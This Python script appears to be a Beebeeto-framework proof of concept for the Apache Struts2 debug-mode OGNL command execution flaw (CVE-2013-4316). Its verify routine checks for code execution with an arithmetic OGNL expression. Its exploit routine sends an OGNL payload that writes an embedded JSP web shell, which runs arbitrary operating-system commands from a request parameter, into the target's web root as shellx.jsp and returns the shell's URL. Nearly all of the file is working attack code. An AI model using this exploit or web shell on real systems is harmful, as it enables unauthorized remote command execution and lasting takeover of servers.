#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import httplib, urllib
import re

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0018',  # 由Beebeeto官方编辑
            'name': 'Struts2 debug Command Execution POC',  # 名称
            'author': 't0nyhj',  # 作者
            'create_date': '2014-09-22',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'struts2',  # 漏洞所涉及的应用名称
            'vul_version': ['2.0.0, 2.3.15.1'],  # 受漏洞影响的应用版本
            'type': 'Command Execution',  # 漏洞类型
            'tag': ['struts2', 'man in middle'],  # 漏洞相关Tag
            'desc': '''
                    Apache Struts 2.0.0 through 2.3.15.1 enables Dynamic Method Invocation by default,
                    which has unknown impact and attack vectors.
                    ''',  # 漏洞描述
            'references': ['http://sebug.net/vuldb/ssvid-61048',
                           'http://qqhack8.blog.163.com/blog/static/114147985201402743220859',
                           'http://cve.scap.org.cn/CVE-2013-4316.html',
                           ],  # 参考链接
        },
    }

    @classmethod
    def verify(cls, args):
        payload = urllib.urlencode({'debug': 'command', 'expression': """#w=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#w.println(5678*8765+1234),#w.flush(),#w.close()"""})
        headers = {"Content-type": "application/x-www-form-urlencoded"
            ,"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
            , "Expect": "100-continue"}
        attack_url = args['options']['target']
        if args['options']['verbose']:
            print '[*] Request URL: ' + attack_url
            print '[*] Post Data: ' + payload
        host = re.findall("\/\/(.*?)\/", attack_url)[0]

        httpClient = httplib.HTTPConnection(host, timeout=3)
        httpClient.request("POST", attack_url, payload, headers)
        response = httpClient.getresponse()
        res = response.read(100)
        if r'49768904' in res:
            args['success'] = True
            args['poc_ret']['vul_url'] = args['options']['target']
            if args['options']['verbose']:
                print '[*] COULD CMD-EXEC!!!'
            return args
        else:
            args['success'] = False
            return args


    @classmethod
    def exploit(cls, args):  # 实现exploit模式的主函数
        payload = urllib.urlencode({'debug': 'command', 'expression': """#w=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#w.println(5678*8765+1234),#w.flush(),#w.close()"""})
        headers = {"Content-type": "application/x-www-form-urlencoded"
            ,"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
            , "Expect": "100-continue"}
        attack_url = args['options']['target']
        if args['options']['verbose']:
            print '[*] {url} - Ready to Getting shell ...'.format(url=args['options']['target'])

        webshell = r'''<%@ page import="java.util.*,java.io.*"%>
                    <%
                    %>
                    <HTML><BODY>
                    Commands with JSP
                    <FORM METHOD="GET" NAME="myform" ACTION="">
                    <INPUT TYPE="text" NAME="cmd">
                    <INPUT TYPE="submit" VALUE="Send">
                    </FORM>
                    <pre>
                    <%
                    if (request.getParameter("cmd") != null) {
                    out.println("Command: " + request.getParameter("cmd") + "<BR>");
                    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
                    OutputStream os = p.getOutputStream();
                    InputStream in = p.getInputStream();
                    DataInputStream dis = new DataInputStream(in);
                    String disr = dis.readLine();
                    while ( disr != null ) {
                    out.println(disr);
                    disr = dis.readLine();
                    }
                    }
                    %>
                    </pre>
                    </BODY></HTML>'''


        params2=urllib.urlencode({'debug':'command','expression':r'''#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#a=#req.getSession(),#b=#a.getServletContext(),#c=#b.getRealPath("/"),#fos=new java.io.FileOutputStream(new java.lang.StringBuilder(#c).append("/shellx.jsp").toString()),#fos.write(#req.getParameter("shell").getBytes()),#fos.close(),#shell=new java.io.File(new java.lang.StringBuilder(#c).append("/shellx.jsp").toString()),#w=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#w.println(#shell.exists()?'{oktyuioplkjn}'+#b.getContextPath()+'/shellx.jsp{oktyuioplkjn}':'{fail}'),#w.flush(),#w.close()''','shell':webshell})
        attack_url = args['options']['target']
        if args['options']['verbose']:
            print '[*] Request URL: ' + attack_url
            print '[*] Try To Get Shell\n'
        host = re.findall("\/\/(.*?)\/", attack_url)[0]
        httpClient1 = httplib.HTTPConnection(host, timeout=3)
        httpClient1.request("POST", attack_url, params2, headers)
        response = httpClient1.getresponse()
        resp = response.read()
        shell = re.findall(r'''\{oktyuioplkjn\}(.*?)\{oktyuioplkjn\}''',resp,re.S)
        if shell:
           shell_path='http://'+host+shell[0]+"\n"
           args['success'] = True
           args['poc_ret']['vul_url'] = args['options']['target']
           args['poc_ret']['shell_path'] = shell_path
           if args['options']['verbose']:
               print '[*] GO TO SHELL:  ' +shell_path
           return args
        else:
           args['success'] = False
           return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
